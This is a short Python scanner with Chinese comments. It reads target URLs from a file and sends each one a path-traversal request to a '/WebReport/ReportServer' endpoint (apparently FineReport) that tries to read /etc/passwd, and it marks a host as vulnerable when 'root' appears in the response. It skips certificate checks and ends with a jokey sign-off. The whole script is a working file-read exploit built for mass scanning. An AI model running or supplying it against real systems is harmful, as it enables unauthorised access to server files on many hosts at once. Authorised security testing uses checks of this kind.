import requests
import re
import urllib3
from colorama import init, Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)  # 初始化 colorama

def check_vulnerability(url):
    try:
        # 添加漏洞测试路径到 URL
        test_url = url + "/WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true"
        
        # 发送 HTTP GET 请求，忽略SSL证书验证错误
        response = requests.get(test_url, verify=False)
        
        # 检查响应内容是否包含 "root"
        if re.search(r'root', response.text):
            print(Fore.RED + "[存在漏洞]: " + url)
            return  # 如果存在漏洞，立即返回，不再继续输出
    except Exception as e:
        print("Error occurred while testing {}: {}".format(url, str(e)))
    
    # 如果没有发生异常或者没有发现漏洞，输出该网址
    print("[*]:", url)

# 读取文件中的每个网址
with open('1.txt', 'r') as file:
    for line in file:
        url = line.strip()
        check_vulnerability(url)

print("公主殿下，臣检查完了——————小呆呆")
